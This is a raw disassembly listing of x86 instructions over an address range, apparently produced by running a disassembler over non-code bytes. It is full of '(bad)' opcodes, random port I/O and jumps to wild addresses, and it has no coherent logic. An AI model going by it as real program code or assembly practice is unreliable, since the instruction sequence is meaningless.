  42d4d2:	ficom  DWORD PTR [ebp-0x4cdddc58]
  42d4d8:	xor    DWORD PTR [edx+ebx*1],0xd550e288
  42d4df:	clc    
  42d4e0:	pop    ebx
  42d4e1:	xchg   esp,eax
  42d4e2:	out    0x73,al
  42d4e4:	mov    dh,0x52
  42d4e6:	jbe    0x42d469
  42d4e8:	bound  esp,QWORD PTR [esp+edx*8]
  42d4eb:	push   eax
  42d4ec:	add    BYTE PTR [edi+0x34571d5e],ch
  42d4f2:	fimul  DWORD PTR [ebx]
  42d4f4:	add    DWORD PTR [eax],ebx
  42d4f6:	xchg   esi,eax
  42d4f7:	rcl    DWORD PTR [ecx+0x3a],0x23
  42d4fb:	scas   al,BYTE PTR es:[edi]
  42d4fc:	pop    ebp
  42d4fd:	shl    DWORD PTR [eax],cl
  42d4ff:	mov    al,ds:0x260d566
  42d505:	inc    edx
  42d506:	jnp    0x42d4cf
  42d508:	retf   
  42d509:	(bad)  
  42d50a:	xor    DWORD PTR [edx-0x6b05dbe],ecx
  42d510:	icebp  
  42d511:	lods   eax,DWORD PTR ds:[esi]
  42d512:	inc    esp
  42d513:	sbb    eax,DWORD PTR [edi]
  42d515:	aad    0xb2
  42d517:	test   al,0x76
  42d519:	dec    esi
  42d51a:	jg     0x42d516
  42d51c:	add    eax,0xe15d619c
  42d521:	pop    esp
  42d522:	pop    es
  42d523:	or     BYTE PTR [ebp-0x62fa5ad],ch
  42d529:	mov    ch,0xe
  42d52b:	and    eax,0xdf35f66e
  42d530:	inc    ebp
  42d531:	sub    DWORD PTR [edi-0x2a],esi
  42d534:	push   cs
  42d535:	jge    0x42d54c
  42d537:	add    ebp,eax
  42d539:	inc    edi
  42d53a:	in     al,dx
  42d53b:	cmp    eax,0xfc8ee568
  42d540:	sbb    esi,DWORD PTR [eax-0x25]
  42d543:	out    dx,eax
  42d544:	out    dx,eax
  42d545:	xchg   edx,eax
  42d546:	adc    al,0xdd
  42d548:	fiadd  DWORD PTR [esp+ebp*4+0x7]
  42d54c:	retf   0xa72f
  42d54f:	push   eax
  42d550:	clc    
  42d551:	inc    ecx
  42d552:	push   esi
  42d553:	jns    0x42d5cf
  42d555:	xchg   ebx,eax
  42d556:	test   al,0xea
  42d558:	xchg   esp,eax
  42d559:	or     BYTE PTR [edx+ebx*8],dh
  42d55c:	mov    ecx,DWORD PTR [esi+0x38]
  42d55f:	mov    edx,0x25a2b5e5
  42d564:	dec    ebp
  42d565:	out    dx,eax
  42d566:	add    DWORD PTR [edi],edi
  42d568:	push   edi
  42d569:	aaa    
  42d56a:	mov    al,ds:0x95daae
	...
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0x228e52d5,eax
  42d5e5:	outs   dx,DWORD PTR ds:[esi]
  42d5e6:	addr16 out 0x1,al
  42d5e9:	add    BYTE PTR [eax],al
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    BYTE PTR [ecx+0x41f0d56b],ch
  42d5f3:	fcmovbe st,st(0)
  42d5f5:	loop   0x42d60c
  42d5f7:	es daa 
  42d5f9:	adc    ebx,DWORD PTR [ebx+0x7ec5c085]
  42d5ff:	cdq    
  42d600:	mov    al,ds:0xa3884232
  42d605:	xor    bh,0x59
  42d608:	cmp    BYTE PTR [ecx],dh
  42d60a:	sub    eax,DWORD PTR [edi-0x54]
  42d60d:	adc    al,0xc5
  42d60f:	pop    ebp
  42d610:	aas    
  42d611:	loopne 0x42d5f8
  42d613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d614:	les    edx,FWORD PTR [ebx+eax*1]
  42d617:	pusha  
  42d618:	daa    
  42d619:	sar    BYTE PTR [ebx-0x5fe898ce],cl
  42d61f:	pop    edx
  42d620:	(bad)  
  42d621:	dec    esp
  42d622:	cmp    DWORD PTR [ebp+0x8],0xfffffffb
  42d626:	pop    edx
  42d627:	clc    
  42d628:	cdq    
  42d629:	add    ecx,DWORD PTR ds:0xd0445cc2
  42d62f:	pop    ds
  42d630:	in     al,dx
  42d631:	mov    DWORD PTR [edx-0xc90c796],ebx
  42d637:	xchg   ecx,eax
  42d638:	test   eax,0x8df1f7bd
  42d63d:	das    
  42d63e:	or     eax,0x8bcb07aa
  42d643:	and    al,0x90
  42d645:	stc    
  42d646:	fidiv  WORD PTR [edi]
  42d648:	mov    al,0x92
  42d64a:	xchg   BYTE PTR ds:0xac839d5c,bh
  42d650:	xchg   ebx,eax
  42d651:	aaa    
  42d652:	pop    ds
  42d653:	sbb    al,0x83
  42d655:	fstp   DWORD PTR [ebp+0x242dd2a5]
  42d65b:	or     BYTE PTR [ebx],al
  42d65d:	jne    0x42d6af
  42d65f:	mov    bl,BYTE PTR [edx-0x80]
  42d662:	jae    0x42d685
  42d664:	jne    0x42d65c
  42d666:	outs   dx,DWORD PTR ds:[esi]
  42d667:	lahf   
  42d668:	pop    ds
  42d669:	adc    edx,DWORD PTR [ebp-0xdd5a91e]
  42d66f:	xchg   BYTE PTR gs:[edi+ecx*2+0x3057b813],cl
  42d677:	jmp    0x42d6c9
  42d679:	push   esi
  42d67a:	pop    es
  42d67b:	mov    cl,0xf2
  42d67d:	(bad)  
  42d67e:	inc    eax
  42d67f:	fwait
  42d680:	mov    esi,DWORD PTR [edi]
  42d682:	popf   
  42d683:	test   BYTE PTR [edx-0x2f728529],bl
  42d689:	push   cs
  42d68a:	cmp    BYTE PTR [ecx+0x56],ah
  42d68d:	jle    0x42d693
  42d68f:	mov    al,BYTE PTR [ebx+ebx*1-0x2096edb7]
  42d696:	mov    ds:0x29720cd5,eax
  42d69b:	jmp    0x58864ce0
  42d6a0:	enter  0xff2a,0x0
  42d6a4:	iret   
  42d6a5:	jge    0x42d68d
  42d6a7:	icebp  
  42d6a8:	fcom   DWORD PTR [edi]
  42d6aa:	(bad)  
  42d6ab:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6ad:	or     al,BYTE PTR [ebx-0x313af019]
  42d6b3:	(bad)  
  42d6b4:	push   cs
  42d6b5:	pop    edi
  42d6b6:	dec    ecx
  42d6b7:	mov    ecx,0x80e417d2
  42d6bc:	adc    al,0x76
  42d6be:	stos   DWORD PTR es:[edi],eax
  42d6bf:	xor    ch,0x2f
  42d6c2:	cmp    al,0x63
  42d6c4:	add    esp,eax
  42d6c6:	push   ss
  42d6c7:	shl    DWORD PTR [ebp+0xc382820],cl
  42d6cd:	repnz or dh,dl
  42d6d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6d1:	cmp    esp,DWORD PTR [edx]
  42d6d3:	and    DWORD PTR [ebx+0x2f],ebp
  42d6d6:	test   eax,0x6552c0cd
  42d6db:	mov    ebx,0xcf5063cd
  42d6e0:	push   esi
  42d6e1:	or     eax,0x21752112
  42d6e6:	outs   dx,BYTE PTR ds:[esi]
  42d6e7:	shl    DWORD PTR [ebp+esi*4-0x14],0x9a
  42d6ec:	and    dl,BYTE PTR [eax+0x0]
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0xd4
  42d763:	pop    esi
  42d764:	xor    ecx,edx
  42d766:	addr16 out 0x1,eax
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    ch,al
  42d76f:	ds nop
  42d771:	cmp    al,bh
  42d773:	xchg   edi,eax
  42d774:	(bad)  [edi]
  42d776:	call   0xb201d7ce
  42d77b:	sub    DWORD PTR [ecx],ebp
  42d77d:	and    edi,0xd451fb8d
  42d783:	xor    al,0x44
  42d785:	jl     0x42d78a
  42d787:	push   cs
  42d788:	shl    bl,1
  42d78a:	dec    ebx
  42d78b:	nop
  42d78c:	push   ebp
  42d78d:	xchg   esi,eax
  42d78e:	ret    0xfa4
  42d791:	enter  0xd5f1,0xc2
  42d795:	jg     0x42d7e8
  42d797:	cmp    al,0x6a
  42d799:	sahf   
  42d79a:	ret    0x7682
  42d79d:	sub    eax,0x91ff5198
  42d7a2:	(bad)  
  42d7a3:	in     eax,0x93
  42d7a5:	jb     0x42d7ff
  42d7a7:	and    al,BYTE PTR [edi+0x4f]
  42d7aa:	pop    esp
  42d7ab:	sbb    BYTE PTR [ecx],dl
  42d7ad:	push   es
  42d7ae:	pop    ebx
  42d7af:	pop    esi
  42d7b0:	js     0x42d817
  42d7b2:	push   ecx
  42d7b3:	jno    0x42d7c1
  42d7b5:	xchg   esp,eax
  42d7b6:	call   0xd0c5:0x2bef04fc
  42d7bd:	mov    esi,0xd67c6c55
  42d7c2:	mov    ch,0x83
  42d7c4:	jnp    0x42d80b
  42d7c6:	jmp    FWORD PTR [ebx]
  42d7c8:	or     esp,DWORD PTR [ebx+0x1cf6dc8f]
  42d7ce:	and    al,0xb5
  42d7d0:	cwde   
  42d7d1:	mov    ch,0x82
  42d7d3:	and    eax,0xfd619da7
  42d7d8:	pop    eax
  42d7d9:	jmp    0x48f2:0xc0478a01
  42d7e0:	and    al,0xa0
  42d7e2:	mov    dh,BYTE PTR [esi+0x6b48e835]
  42d7e8:	add    DWORD PTR [eax],esp
  42d7ea:	std    
  42d7eb:	pop    edi
  42d7ec:	cmp    ebp,edx
  42d7ee:	fucomip st,st(7)
  42d7f0:	aad    0x52
  42d7f2:	xor    al,ah
  42d7f4:	scas   eax,DWORD PTR es:[edi]
  42d7f5:	pop    edi
  42d7f6:	mov    edi,0x6fd51e81
  42d7fb:	or     BYTE PTR [eax],bh
  42d7fd:	dec    esi
  42d7fe:	fdivr  QWORD PTR [ebp+edx*4+0x77]
  42d802:	retf   0xb18e
  42d805:	and    DWORD PTR [ecx],0xffffffd4
  42d808:	div    BYTE PTR [ebp-0xe004d9b]
  42d80e:	lods   al,BYTE PTR ds:[esi]
  42d80f:	fldl2t 
  42d811:	shr    DWORD PTR [ebx*2-0x6b7d4aa2],cl
  42d818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d819:	pushf  
  42d81a:	or     eax,0x7792b812
  42d81f:	xor    DWORD PTR [eax-0x70],eax
  42d822:	mov    dh,0x24
  42d824:	test   al,0x9e
  42d826:	imul   esp
  42d828:	mov    dl,0x4b
  42d82a:	(bad)  
  42d82b:	dec    edi
  42d82c:	neg    DWORD PTR [ebp-0x12]
  42d82f:	jmp    0x2f2fe7b0
  42d834:	add    al,BYTE PTR ds:0x3bd3c3cb
  42d83a:	dec    eax
  42d83b:	shl    DWORD PTR [eax+0x60],1
  42d83e:	xlat   BYTE PTR ds:[ebx]
  42d83f:	aam    0x7f
  42d841:	shl    DWORD PTR [ecx-0x1983e0ff],0x94
  42d848:	retf   0x59a4
  42d84b:	mov    dh,0xbe
  42d84d:	fisubr WORD PTR [ecx+0x3f]
  42d850:	and    esp,DWORD PTR [edx+eax*1-0x6c3577f3]
  42d857:	sbb    eax,DWORD PTR gs:[edi-0xe]
  42d85b:	sti    
  42d85c:	mov    al,ds:0x5e23e650
  42d861:	retf   
  42d862:	cdq    
  42d863:	xchg   ecx,eax
  42d864:	cs push edx
  42d866:	jmp    0xbd1e8b3b
  42d86b:	ins    BYTE PTR es:[edi],dx
  42d86c:	mov    dh,0xb7
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x18c6961a
  42d8e3:	jmp    0x1:0xe8677cab
  42d8ea:	add    BYTE PTR [ecx],al
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	das    
  42d8ef:	in     al,dx
  42d8f0:	mov    ecx,0xa63ccf75
  42d8f5:	adc    al,0x54
  42d8f7:	sbb    al,0x7b
  42d8f9:	pcmpgtw mm6,mm5
  42d8fc:	(bad)  
  42d8fd:	ins    DWORD PTR es:[edi],dx
  42d8fe:	leave  
  42d8ff:	test   al,0x8e
  42d901:	es jp  0x42d8fc
  42d904:	sub    esi,DWORD PTR [ecx]
  42d906:	dec    ebx
  42d907:	push   0xb0d25aa
  42d90c:	xchg   edi,eax
  42d90d:	out    0x41,eax
  42d90f:	(bad)  
  42d910:	in     al,0x1a
  42d912:	cmp    eax,0xd488c0c
  42d917:	bound  edx,QWORD PTR [edx+0x61e1fa73]
  42d91d:	scas   al,BYTE PTR es:[edi]
  42d91e:	push   edx
  42d91f:	mov    cs,WORD PTR [esi+0x4c]
  42d922:	xchg   DWORD PTR [eax-0x1779b06],esp
  42d928:	hlt    
  42d929:	xor    eax,0x276f1a32
  42d92e:	xchg   ebp,eax
  42d92f:	jg     0x42d8f4
  42d931:	fnsave [esi-0x10]
  42d934:	outs   dx,DWORD PTR ds:[esi]
  42d935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d936:	fld1   
  42d938:	xor    BYTE PTR [edx+0x65],bh
  42d93b:	adc    al,0xb3
  42d93d:	sub    DWORD PTR [ecx],ebp
  42d93f:	je     0x42d917
  42d941:	pushf  
  42d942:	sahf   
  42d943:	jbe    0x42d924
  42d945:	das    
  42d946:	sqrtps xmm5,XMMWORD PTR ds:0xae3dbb87
  42d94d:	jns    0x42d9c7
  42d94f:	ss jmp 0xbd98c94f
  42d955:	dec    ebx
  42d956:	clc    
  42d957:	das    
  42d958:	and    eax,0x22eef8c5
  42d95d:	jmp    0x5d251e7e
  42d962:	mov    bh,0xce
  42d965:	xor    bl,dl
  42d967:	fst    DWORD PTR ds:0x507d783e
  42d96d:	in     al,0x6d
  42d96f:	out    dx,al
  42d970:	ret    0x36ee
  42d973:	xchg   esi,eax
  42d974:	or     esi,DWORD PTR [edx-0x28a06052]
  42d97a:	fidivr WORD PTR [edi+ebx*2+0x53d75c23]
  42d981:	pushf  
  42d982:	xchg   edi,eax
  42d983:	sub    edi,DWORD PTR ds:0xf2349d4b
  42d989:	iret   
  42d98a:	leave  
  42d98b:	mov    edi,0x11760537
  42d990:	mov    ebx,0x35278a
  42d995:	fwait
  42d996:	push   ebp
  42d997:	cdq    
  42d998:	push   esp
  42d999:	mov    ecx,0x326af74f
  42d99e:	iret   
  42d99f:	sub    al,0xff
  42d9a1:	cdq    
  42d9a2:	jecxz  0x42d979
  42d9a4:	imul   esp,esi,0xffffffa0
  42d9a7:	sbb    DWORD PTR [ebp+0x62a57747],esi
  42d9ad:	std    
  42d9ae:	inc    esp
  42d9af:	sbb    eax,DWORD PTR [edi-0x730aa27]
  42d9b5:	inc    ebp
  42d9b6:	inc    eax
  42d9b7:	sub    al,0x24
  42d9b9:	jmp    0xd865e005
  42d9be:	jo     0x42d975
  42d9c0:	push   esp
  42d9c1:	sub    BYTE PTR [ebp+0x54e305a3],dl
  42d9c7:	inc    ebx
  42d9c8:	jg     0x42d9f1
  42d9ca:	sub    eax,0xd876f14e
  42d9cf:	mov    bl,0xbf
  42d9d1:	je     0x42d996
  42d9d3:	pop    ecx
  42d9d4:	push   ebp
  42d9d5:	jmp    0x9782c2f3
  42d9da:	push   ds
  42d9db:	in     eax,dx
  42d9dc:	jne    0x42d97d
  42d9de:	lods   eax,DWORD PTR ds:[esi]
  42d9df:	inc    eax
  42d9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d9e1:	loope  0x42d9c6
  42d9e3:	retf   
  42d9e4:	pop    edi
  42d9e5:	aam    0x8b
  42d9e7:	push   esi
  42d9e8:	jns    0x42d9ce
  42d9ea:	xchg   ecx,eax
  42d9eb:	cmp    BYTE PTR [ecx+0xe1],ch
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	cmp    edi,DWORD PTR [edi-0x1698eb2a]
  42da68:	add    DWORD PTR [eax],eax
  42da6a:	add    BYTE PTR [ecx],al
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	stc    
  42da6f:	iret   
  42da70:	popa   
  42da71:	fmul   QWORD PTR [esi]
  42da73:	lds    edx,FWORD PTR [edi-0x56]
  42da76:	pop    esi
  42da77:	addr16 js 0x42da53
  42da7a:	add    DWORD PTR [ecx],ebp
  42da7c:	mov    dh,0x63
  42da7e:	dec    eax
  42da7f:	(bad)  
  42da81:	jo     0x42daf3
  42da83:	mov    dl,0x37
  42da85:	or     DWORD PTR [esp+esi*8+0x6f2fe3d0],esi
  42da8c:	xchg   DWORD PTR fs:[edx-0x59a05fb],esi
  42da93:	jo     0x42da7a
  42da95:	inc    ecx
  42da96:	xchg   ebx,eax
  42da97:	adc    eax,0x683ed675
  42da9c:	aaa    
  42da9d:	push   esp
  42da9e:	xchg   ebx,eax
  42da9f:	jecxz  0x42dab1
  42daa1:	push   edx
  42daa2:	xchg   edx,eax
  42daa3:	mov    al,0x6f
  42daa5:	jno    0x42da7e
  42daa7:	lds    esi,FWORD PTR [edi+0x5a795d71]
  42daad:	lods   al,BYTE PTR ds:[esi]
  42daae:	(bad)  
  42daaf:	push   edx
  42dab0:	sub    ch,dh
  42dab2:	daa    
  42dab3:	stc    
  42dab4:	mov    ch,0x95
  42dab6:	enter  0x2761,0xb2
  42daba:	inc    ecx
  42dabb:	lods   al,BYTE PTR ds:[esi]
  42dabc:	or     al,BYTE PTR [ebx-0x6c1cb356]
  42dac2:	push   cs
  42dac3:	imul   BYTE PTR [ecx]
  42dac5:	fistp  QWORD PTR [edi-0x67]
  42dac8:	mov    esp,0xd2df3137
  42dacd:	push   ds
  42dace:	cmp    dl,BYTE PTR [edi]
  42dad0:	xlat   BYTE PTR ds:[ebx]
  42dad1:	cmp    DWORD PTR [ecx],ebx
  42dad3:	cmp    dl,BYTE PTR [edx+eax*2-0x47]
  42dad7:	in     eax,0x7d
  42dad9:	dec    esp
  42dada:	stos   BYTE PTR es:[edi],al
  42dadb:	jbe    0x42db28
  42dadd:	jp     0x42dafc
  42dadf:	cmp    bl,BYTE PTR [ebp+0x42]
  42dae2:	ss mov ebp,0x1b230734
  42dae8:	pop    ebx
  42dae9:	cmp    DWORD PTR [eax-0x47],esp
  42daec:	push   edx
  42daed:	xchg   DWORD PTR [ebx+0x11f49916],esp
  42daf3:	mov    dh,0x6a
  42daf5:	xchg   edi,eax
  42daf6:	dec    ebx
  42daf7:	fstp   TBYTE PTR [ecx-0x2096058a]
  42dafd:	outs   dx,BYTE PTR ds:[esi]
  42dafe:	test   DWORD PTR [esi+0xc],edx
  42db01:	(bad)  
  42db02:	or     eax,0xb6908175
  42db07:	jmp    0x2bad2703
  42db0c:	fisubr WORD PTR [esi-0x1c]
  42db0f:	push   0x7d62c5af
  42db14:	push   edx
  42db15:	or     edi,edx
  42db17:	fcom   DWORD PTR [esi-0x79]
  42db1a:	(bad)  
  42db1b:	sub    ah,BYTE PTR ds:[edi]
  42db1e:	push   ebp
  42db1f:	xchg   ebx,eax
  42db20:	xchg   ecx,eax
  42db21:	lock in eax,0xae
  42db24:	adc    DWORD PTR [ecx+0x65],edx
  42db27:	sar    DWORD PTR [eax+ebp*1+0x415ec881],cl
  42db2e:	daa    
  42db2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db30:	xor    al,0x6c
  42db32:	push   ss
  42db33:	sbb    DWORD PTR [esi-0x5884c02],esi
  42db39:	push   esi
  42db3a:	loopne 0x42daeb
  42db3c:	push   ecx
  42db3d:	cmp    ebp,eax
  42db3f:	call   0x4851:0xeabd6afd
  42db46:	xlat   BYTE PTR ds:[ebx]
  42db47:	dec    ebx
  42db48:	adc    BYTE PTR [edi-0x3b],0xb2
  42db4c:	sub    BYTE PTR ds:0xdfae89b,cl
  42db52:	test   DWORD PTR ds:[esi],0xbe982d35
  42db59:	aas    
  42db5a:	dec    ebx
  42db5b:	test   al,0x0
  42db5d:	pop    ebp
  42db5e:	push   cs
  42db5f:	data16 into 
  42db61:	or     ebx,DWORD PTR [ebp+ebp*2-0x1fb52699]
  42db68:	mov    edi,0x73221dd4
	...
  42dbd5:	add    BYTE PTR [eax-0x2093e086],dh
  42dbdb:	ins    DWORD PTR es:[edi],dx
  42dbdc:	repz (bad) 
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dc57
  42dbe3:	mov    ch,0x1a
  42dbe5:	inc    ebx
  42dbe6:	addr16 jmp 0x0:0x1000001
  42dbee:	repz jnp 0x42dc6a
  42dbf1:	sbb    DWORD PTR [ebp+0x2b0a42c5],ebx
  42dbf7:	and    cl,BYTE PTR [ebx-0xc8fd68b]
  42dbfd:	dec    edi
  42dbfe:	lods   al,BYTE PTR ds:[esi]
  42dbff:	ret    0x70ae
  42dc02:	test   DWORD PTR ds:0xcbf67570,esp
  42dc08:	aam    0x91
  42dc0a:	inc    ecx
  42dc0b:	inc    eax
  42dc0c:	fmul   QWORD PTR [ebp+0x3827fbac]
  42dc12:	xor    eax,0x8f98305e
  42dc17:	dec    eax
  42dc18:	mov    al,ds:0xf3775e15
  42dc1d:	repnz retf 0x2606
  42dc21:	and    BYTE PTR [eax+0x63],bh
  42dc24:	out    0x97,eax
  42dc26:	ja     0x42dc56
  42dc28:	jge    0x42dbc1
  42dc2a:	imul   esp,DWORD PTR [esi-0x6],0x51
  42dc2e:	rcl    BYTE PTR [ecx],cl
  42dc30:	bound  ebp,QWORD PTR [edx+0x2d]
  42dc33:	dec    esp
  42dc34:	and    al,0xeb
  42dc36:	addr16 mov ebp,0xf0515de2
  42dc3c:	xlat   BYTE PTR ds:[ebx]
  42dc3d:	lods   al,BYTE PTR ds:[esi]
  42dc3e:	out    dx,eax
  42dc3f:	cmp    DWORD PTR cs:[esi+0x34e31e4],ebx
  42dc46:	retf   0x2bd
  42dc49:	mov    BYTE PTR [ebx+eax*2+0x4a],cl
  42dc4d:	gs std 
  42dc4f:	push   ebx
  42dc50:	push   ds
  42dc51:	or     DWORD PTR [edi+eax*8+0x7cc73c48],edi
  42dc58:	adc    edx,DWORD PTR gs:[esi+0x67]
  42dc5c:	cmp    DWORD PTR [esi+0x16],edx
  42dc5f:	aas    
  42dc60:	ret    
  42dc61:	xchg   edi,eax
  42dc62:	call   0xd9b:0xc1c61216
  42dc69:	dec    ebp
  42dc6a:	add    edi,DWORD PTR [edi]
  42dc6c:	test   eax,0x5257d90c
  42dc71:	pop    esi
  42dc72:	add    DWORD PTR [ecx],0x32
  42dc75:	adc    DWORD PTR [eax],esi
  42dc77:	xor    eax,DWORD PTR [ecx]
  42dc79:	jge    0x42dca2
  42dc7b:	mov    ebx,0xd3a65da2
  42dc80:	ror    DWORD PTR [eax-0x74ef00a0],0x54
  42dc87:	inc    eax
  42dc88:	(bad)  
  42dc89:	fsub   QWORD PTR [edx]
  42dc8b:	add    BYTE PTR [ebp-0x1],al
  42dc8e:	push   0x45fc24c7
  42dc93:	cld    
  42dc94:	push   edx
  42dc95:	jnp    0x42dc8d
  42dc97:	jns    0x42dc8e
  42dc99:	jle    0x42dcdd
  42dc9b:	hlt    
  42dc9c:	xchg   esi,eax
  42dc9d:	inc    eax
  42dc9e:	inc    edx
  42dc9f:	add    DWORD PTR [ebp+ebx*2-0x68],0x14
  42dca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dca5:	pop    eax
  42dca6:	mov    DWORD PTR [edi],esp
  42dca8:	shl    DWORD PTR [eax],0x41
  42dcab:	fcmovnu st,st(1)
  42dcad:	ret    0xea74
  42dcb0:	fcomp  DWORD PTR [ecx*4+0x31795598]
  42dcb7:	cmc    
  42dcb8:	xchg   ecx,eax
  42dcb9:	scas   eax,DWORD PTR es:[edi]
  42dcba:	cmp    bl,BYTE PTR [edx+0x43]
  42dcbd:	fsub   DWORD PTR [edi+0x53]
  42dcc0:	xchg   esp,eax
  42dcc1:	scas   eax,DWORD PTR es:[edi]
  42dcc2:	adc    BYTE PTR [eax-0x3c],0x1c
  42dcc6:	xchg   ebp,eax
  42dcc7:	cdq    
  42dcc8:	push   0x679d7d94
  42dccd:	cmp    BYTE PTR [esi],0xfa
  42dcd0:	test   DWORD PTR [eax+0x32],ebp
  42dcd3:	or     bl,bh
  42dcd5:	dec    ebp
  42dcd6:	mov    eax,edx
  42dcd8:	ins    DWORD PTR es:[edi],dx
  42dcd9:	jb     0x42dcf2
  42dcdb:	push   edi
  42dcdc:	xchg   esi,eax
  42dcdd:	retf   0x6fbb
  42dce0:	out    dx,al
  42dce1:	jecxz  0x42dcd3
  42dce3:	cmp    dl,BYTE PTR [ecx]
  42dce5:	retf   
  42dce6:	dec    edi
  42dce7:	mov    ch,0xc6
  42dce9:	cs int 0x65
  42dcec:	je     0x42dd15
	...
  42dd56:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	dec    edx
  42dd63:	fsubr  DWORD PTR [edi+0x1eb67c2]
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    ch,bh
  42dd6f:	or     BYTE PTR [ecx],bl
  42dd71:	inc    esi
  42dd72:	ds scas eax,DWORD PTR es:[edi]
  42dd74:	pop    ecx
  42dd75:	mov    ebx,eax
  42dd77:	data16 jl 0x42dd7a
  42dd7a:	xor    cl,BYTE PTR [edx]
  42dd7c:	or     BYTE PTR [edx+0x7e],ah
  42dd7f:	push   ebp
  42dd80:	das    
  42dd81:	out    0xe8,al
  42dd83:	clc    
  42dd84:	mov    al,ds:0x48d1f700
  42dd89:	xor    BYTE PTR ss:[edi+0x1],dh
  42dd8d:	shl    ecx,0xb8
  42dd90:	ret    
  42dd91:	iret   
  42dd92:	pop    esi
  42dd93:	inc    BYTE PTR [ebx]
  42dd95:	in     eax,0x53
  42dd97:	mov    al,ds:0x3a46dd9a
  42dd9c:	xchg   edi,eax
  42dd9d:	jnp    0x42ddf0
  42dd9f:	iret   
  42dda0:	jmp    0x763e864b
  42dda5:	jne    0x42dda9
  42dda7:	mov    ds:0x669655ba,eax
  42ddac:	jge    0x42dde2
  42ddae:	imul   esp,DWORD PTR [edx-0x17b82136],0xffffffa9
  42ddb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ddb6:	out    dx,eax
  42ddb7:	int3   
  42ddb8:	out    dx,al
  42ddb9:	lods   eax,DWORD PTR ds:[esi]
  42ddba:	das    
  42ddbb:	mov    edi,0xfe2f4c27
  42ddc0:	imul   esp,DWORD PTR [edi*4-0x4708f7fe],0xffffff8a
  42ddc8:	les    esp,FWORD PTR [ecx]
  42ddca:	cmp    BYTE PTR [edx+0x22f6575f],dl
  42ddd0:	adc    edi,edx
  42ddd2:	loopne 0x42dda0
  42ddd4:	mov    al,ds:0xa6d02c82
  42ddd9:	repz imul edx
  42dddc:	pop    eax
  42dddd:	pop    edx
  42ddde:	jp     0x42de07
  42dde0:	and    al,0x6e
  42dde2:	add    ch,BYTE PTR [edx+edx*4+0x60]
  42dde6:	jno    0x42de38
  42dde8:	imul   esi,DWORD PTR [eax+0x4dc384c1],0xd
  42ddef:	xor    BYTE PTR [esi],0x2
  42ddf2:	cmc    
  42ddf3:	imul   ecx,DWORD PTR [ecx],0xfffffffc
  42ddf6:	loopne 0x42dd95
  42ddf8:	sbb    eax,0xf7f67683
  42ddfd:	mov    edx,0x82133ee
  42de02:	fdivr  st(3),st
  42de04:	cmp    al,BYTE PTR [ecx+0x33471a9a]
  42de0a:	jge    0x42dddc
  42de0c:	cmc    
  42de0d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42de0f:	mov    eax,ecx
  42de11:	jnp    0x42ddcc
  42de13:	adc    eax,0x80e0fee8
  42de18:	mov    bl,0x67
  42de1a:	leave  
  42de1b:	(bad)  
  42de1c:	(bad)  
  42de1e:	push   eax
  42de1f:	clc    
  42de20:	test   al,0x58
  42de22:	add    al,0x70
  42de24:	add    edx,ecx
  42de26:	add    eax,0x79e819af
  42de2b:	fwait
  42de2c:	(bad)  
  42de2d:	jmp    0x4823:0x9ceb9ebe
  42de34:	sub    BYTE PTR [ecx+0x2f],ah
  42de37:	ins    DWORD PTR es:[edi],dx
  42de38:	mov    ecx,0xa9708029
  42de3d:	dec    esp
  42de3e:	enter  0xa34c,0xd8
  42de42:	fs sahf 
  42de44:	in     eax,0x63
  42de46:	inc    edx
  42de47:	test   BYTE PTR ds:0xf3e6eefd,0x1e
  42de4e:	test   al,cl
  42de50:	mov    eax,ds:0x4642b62a
  42de55:	and    DWORD PTR [esi+0xc4960ca],ebx
  42de5b:	loop   0x42de2b
  42de5d:	pushf  
  42de5e:	imul   esp,DWORD PTR [ecx],0x5c35201b
  42de64:	dec    esp
  42de65:	sbb    bl,0x8
  42de68:	or     eax,0xa20143fa
  42de6d:	jge    0x42de6f
	...
  42ded3:	add    BYTE PTR [eax],al
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	fsubr  QWORD PTR [esi-0x22]
  42dee5:	sti    
  42dee6:	addr16 in al,dx
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	ds mov dh,0x7c
  42def1:	push   0xb0090b0f
  42def6:	out    dx,eax
  42def7:	das    
  42def8:	sbb    al,0xe2
